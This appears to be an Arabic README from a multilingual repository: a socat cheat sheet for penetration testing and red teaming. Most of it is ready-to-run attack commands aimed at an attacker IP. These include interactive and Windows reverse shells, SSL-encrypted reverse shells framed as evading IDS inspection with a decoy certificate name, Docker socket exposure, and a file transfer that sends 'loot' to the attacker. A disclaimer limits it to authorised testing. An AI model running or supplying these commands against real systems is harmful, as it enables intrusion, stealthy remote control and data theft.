<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🔄 Socat - ورقة الغش كاملة

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███████╗ ██████╗  ██████╗ █████╗ ████████╗
  ██╔════╝██╔═══██╗██╔════╝██╔══██╗╚══██╔══╝
  ███████╗██║   ██║██║     ███████║   ██║   
  ╚════██║██║   ██║██║     ██╔══██║   ██║   
  ███████║╚██████╔╝╚██████╗██║  ██║   ██║   
  ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝   ╚═╝   
       Multipurpose Relay for Bidirectional Data Transfers & Full TTY Shells
```
<p align="center">
  <img src="https://img.shields.io/badge/Socat-SOcket_CAT-blue?style=for-the-badge" alt="Socat">
  <img src="https://img.shields.io/badge/Category-Exploitation_&_Shells-orange?style=for-the-badge" alt="الاستغلال والأصداف">
  <img src="https://img.shields.io/badge/Protocols-TCP_UDP_SSL_UNIX-green?style=for-the-badge" alt="البروتوكولات">
  <img src="https://img.shields.io/badge/License-GPLv2-red?style=for-the-badge" alt="License GPLv2">
</ص>

<p align="center">
  <b>🌐 إنشاء تدفقي بايت ثنائي الاتجاه ونقل البيانات بين الملفات والأنابيب والأجهزة والمقابس وأنفاق SSL</b>
</ص>

---

## 📋 جدول المحتويات

- [نظرة عامة وهندسة سوكات](#-نظرة عامة--هندسة-سوكات)
- [مقارنة بين Socat وNetcat](#-مقارنة بين Socat وNetcat)
- [التثبيت](#-التثبيت)
- [أصداف TTY العكسية التفاعلية بالكامل](#-أصداف tty-reverse-تفاعلية بالكامل)
  - [مستمع المهاجم (RAW TTY)](#attacker-listener-raw-tty)
  - [الحمولة المستهدفة (Pty Spawn)](#target-payload-pty-spawn)
  - [Windows Target Reverse Shell](#windows-target-reverse-shell)
- [الأصداف العكسية المشفرة عبر SSL/TLS](#-encrypted-reverse-shells-via-ssltls)
  - [إنشاء الشهادات](#إنشاء-الشهادات)
  - [المستمع والاتصال المشفر](#encrypted-listener--connection)
- [إعادة توجيه المنافذ ومرحلات الشبكة](#-إعادة توجيه المنافذ--مرحلات الشبكة)
  - [إعادة توجيه المنفذ المحلي](#local-port-forwarding)
  - [مستمع التفرع (متعدد العملاء)](#forking-listener-multi-client)
  - [مقبس مجال UNIX إلى TCP Relay (إعادة توجيه Docker)](#unix-domain-socket-to-tcp-relay-docker-forwarding)
- [نقل الملفات باستخدام Socat](#-file-transfers-with-socat)
- [الجدول المرجعي السريع](#-الجدول المرجعي السريع)
- [الاعتبارات الدفاعية وOPSEC](#-الاعتبارات الدفاعية--opsec)
- [إخلاء المسؤولية القانونية](#-إخلاء المسؤولية القانونية)

---

## 🎯 نظرة عامة وهندسة سوكات

**Socat** (SOcket CAT) هي أداة مساعدة تعتمد على سطر الأوامر وتقوم بإنشاء تدفقين بايت ثنائي الاتجاه وتنقل البيانات بينهما. نظرًا لأنه يمكن إنشاء التدفقات من مجموعة ضخمة من أنواع العناوين (الملفات، والأنابيب، والأجهزة، ومآخذ توصيل TCP/UDP، وSSL، وIP الخام، وSOCKS4، ومآخذ مجال UNIX)، غالبًا ما يتم وصف Socat على أنه Netcat على المنشطات.

في اختبار الاختراق والفريق الأحمر، يعتبر Socat أسطوريًا بالنسبة لقوتين عظميين أساسيتين:
1. **أصداف TTY العكسية الفورية والتفاعلية بالكامل:** إنتاج محطات زائفة حقيقية (`pty`) مع التحكم في الوظيفة، ومفاتيح الأسهم، والإكمال التلقائي دون الحاجة إلى الجمباز Python أو `stty raw -echo`.
2. ** أنفاق شبكة SSL/TLS المشفرة: ** تجاوز فحص IDS القياسي عن طريق تشفير حمولات النص الواضح عبر SSL.

---

## ⚖️ مقارنة Socat و Netcat

| ميزة | نت كات (`nc`) | نماب `ncat` | سوكات (`socat`) |
|---------|--------------|------------|-----------------|
| ** ظهور قذيفة PTY الأصلية ** | ❌ لا | ❌ لا | ✅ أصلي (`pty,stderr,setsid`) |
| ** تشفير SSL / TLS ** | ❌ لا | ✅ نعم (`--ssl`) | ✅ أصلي (`OPENSSL-LISTEN`, `OPENSSL`) |
| ** شوكة التتابع متعدد العملاء **| ❌ لا | ❌ لا | ✅ أصلي (`fork,reuseaddr`) |
| ** مآخذ مجال UNIX ** | ❌ لا | ✅ محدودة | ✅ أصلي (`UNIX-LISTEN`, `UNIX-CONNECT`) |
| **حجم الملف الثنائي** | الحد الأدنى (~40 كيلو بايت) | متوسط ​​(~500 كيلو بايت) | متوسط ​​(~ 400 كيلو بايت مستقل) |
| ** بناء جملة الأمر ** | أعلام بسيطة (`-lvnp`) | على أساس العلم (`-lvnp`) | بناء جملة الدفق (`<type>:<args>`) |

---

## 📥 التثبيت
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y socat

# Arch Linux
sudo pacman -S socat

# RedHat / CentOS / Fedora
sudo dnf install -y socat
```
---

## 💀 أغطية TTY العكسية التفاعلية بالكامل

عندما تلتقط صدفة عكسية باستخدام Netcat القياسي، فإنك تتلقى صدفة غبية غير مستقرة. يتيح Socat محطة زائفة مستقرة وتفاعلية بالكامل بنسبة 100% مع إكمال علامات التبويب ومعالجة Ctrl+C ودعم محرر الشاشة (`vim`، `nano`).

### مستمع المهاجم (RAW TTY)
```bash
# Listen on port 4444 and hook stdin/stdout directly to your current raw terminal
socat file:`tty`,raw,echo=0 tcp-listen:4444
```
> [!ملاحظة]
> `file:`tty`,raw,echo=0` يضع جهازك الطرفي المحلي في الوضع الأولي ويعطل صدى الأحرف. إذا تم إغلاق الاتصال بشكل غير متوقع وكان جهازك الطرفي لا يستجيب، فاكتب `reset` واضغط على Enter.

### الحمولة المستهدفة (Pty Spawn)
```bash
# Target connects back, spawning a fully interactive PTY bash shell
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444
```
#### تفصيل الخيارات:
- `pty`: يخصص محطة زائفة على النظام المستهدف.
- `stderr`: يعيد توجيه الخطأ القياسي إلى المقبس.
- `setsid`: تشغيل العملية في مجموعة جلسة جديدة (يمنع القتل عند خروج الوالدين).
- `sigint`: يمرر إشارات المقاطعة (Ctrl+C) إلى العملية البعيدة بدلاً من إنهاء الجلسة.
- `sane`: يعيد ضبط إعدادات التحكم الطرفية على الإعدادات الافتراضية القياسية.

### Windows Target Reverse Shell
```bash
# Attacker listener
socat -d -d TCP-LISTEN:4444 STDOUT

# Windows Target connection
socat TCP:10.10.14.5:4444 EXEC:cmd.exe
```
---

## 🔐 الأصداف العكسية المشفرة عبر SSL/TLS

امنع مراقبة أمان الشبكة (NSM) وZeek وSnort من فحص حمولة shell العكسية الخاصة بك عن طريق تشفير حركة المرور باستخدام شهادة SSL/TLS سريعة الزوال.

### إنشاء الشهادات
```bash
# 1. Generate private key and self-signed certificate on attacker machine
openssl req -newkey rsa:2048 -nodes -keyout /tmp/socat.key -x509 -days 365 -out /tmp/socat.crt -subj "/CN=corp-update.local"

# 2. Combine key and cert into a single PEM bundle
cat /tmp/socat.key /tmp/socat.crt > /tmp/socat.pem
```
### المستمع والاتصال المشفر
```bash
# 1. Attacker starts an SSL listener
socat file:`tty`,raw,echo=0 OPENSSL-LISTEN:4443,cert=/tmp/socat.pem,verify=0

# 2. Target connects back over SSL
socat OPENSSL:10.10.14.5:4443,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane
```
---

## 🔀 إعادة توجيه المنافذ ومرحلات الشبكة

يمكن لـ Socat إعادة توجيه حركة المرور الواردة من واجهة شبكة أو منفذ واحد مباشرة إلى هدف بعيد مختلف.

### إعادة توجيه المنفذ المحلي
```bash
# Forward incoming connections on port 8080 to an internal database server
socat TCP-LISTEN:8080,fork TCP:192.168.1.50:3306
```
### مستمع التفرع (متعدد العملاء)

يمكّن خيار `fork` Socat من إنتاج عملية فرعية لكل اتصال وارد جديد، مع إبقاء المستمع الرئيسي مفتوحًا:
```bash
# Multi-client HTTP proxy relay
socat TCP-LISTEN:80,fork,reuseaddr TCP:10.10.10.200:80
```
### مقبس نطاق UNIX إلى TCP Relay (إعادة توجيه Docker)

عند الوصول إلى مأخذ توصيل Docker الخفي المحلي (`/var/run/docker.sock`) بدون حقوق الجذر عبر الشبكة:
```bash
# Expose Docker UNIX socket over TCP port 2375
socat TCP-LISTEN:2375,reuseaddr,fork UNIX-CLIENT:/var/run/docker.sock

# Connect remotely from attacker machine
docker -H tcp://10.10.10.50:2375 ps
```
---

## 📁 نقل الملفات مع Socat
```bash
# 1. Attacker prepares receiving listener
socat -u TCP-LISTEN:9001,reuseaddr OPEN:loot.tar.gz,creat

# 2. Target sends file to attacker
socat -u OPEN:loot.tar.gz TCP:10.10.14.5:9001
```
*(تحدد علامة `-u` الوضع أحادي الاتجاه من العنوان الأول إلى الثاني).*

---

## ⚡ جدول مرجعي سريع

| الهدف | الأمر |
|-----------|--------|
| ** مستمع TTY التفاعلي ** | `socat file:\`tty\`,raw,echo=0 tcp-listen:<PORT>` |
| ** حمولة TTY التفاعلية ** | `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:<PORT>` |
| ** مستمع SSL المشفر ** | `socat file:\`tty\`,raw,echo=0 OPENSSL-LISTEN:<PORT>,cert=<PEM>,verify=0` |
| ** حمولة SSL مشفرة ** | `socat OPENSSL:<IP>:<PORT>,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane` |
| ** إعادة توجيه المنفذ (التتابع) ** | `socat TCP-LISTEN:<LPORT>,fork,reuseaddr TCP:<RHOST>:<RPORT>` |
| ** فضح مقبس UNIX ** | `socat TCP-LISTEN:<PORT>,fork UNIX-CLIENT:<SOCKET_PATH>` |
| **نقل الملفات (المتلقي)** | `socat -u TCP-LISTEN:<PORT> OPEN:<OUTFILE>,creat` |
| **نقل الملفات (المرسل)** | `socat -u OPEN:<INFILE> TCP:<IP>:<PORT>` |

---

## 🛡️ الاعتبارات الدفاعية وOPSEC

1. **تشفير حركة المرور:** تعرض الأصداف العكسية لـ Cleartext TCP الأوامر إلى IDS/IPS. استخدم دائمًا `OPENSSL-LISTEN` و`OPENSSL` أثناء مشاركات الفريق الأحمر.
2. ** مراقبة العملية: ** أوامر إشارة منصات Sysmon / EDR التي تستدعي `pty,stderr,setsid` كدليل إرشادي فوري للصدفة العكسية.
3. **الثنائيات المستقلة:** عند النشر على أنظمة مستهدفة، استخدم ثنائيات Socat المستقلة المجمعة بشكل ثابت لتجنب تبعيات المكتبة المشتركة.

---

## ⚠️إخلاء المسؤولية القانونية

> [!تنبيه]
> ورقة الغش هذه مخصصة لاختبارات الاختراق المعتمدة، والتقييمات الأمنية، والبحث الأكاديمي فقط. يعد الوصول غير المصرح به إلى أنظمة الكمبيوتر والعبث بالشبكة أمرًا غير قانوني تمامًا.